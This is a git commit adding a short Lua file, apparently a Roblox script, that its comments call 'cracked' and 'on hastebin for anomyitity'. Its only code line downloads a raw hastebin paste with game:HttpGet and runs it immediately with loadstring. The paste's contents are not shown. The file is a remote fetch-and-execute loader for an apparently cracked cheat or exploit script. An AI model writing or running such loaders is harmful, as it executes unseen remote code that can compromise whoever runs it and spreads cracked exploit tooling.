4db44e4cfdb7a27000424d05d577f138c15b1c41
lome4 <83579891+lome4@users.noreply.github.com>
2021-12-08 22:32:39 +0000

    Ezzz

---
+++ ultraspecloadstring.lua
@@ -0,0 +1,5 @@
+-- cracked by best crackhead
+-- purple aki sponsors this!
+
+-- Loadstring, on hastebin for anomyitity
+loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/cogusakidi"))()
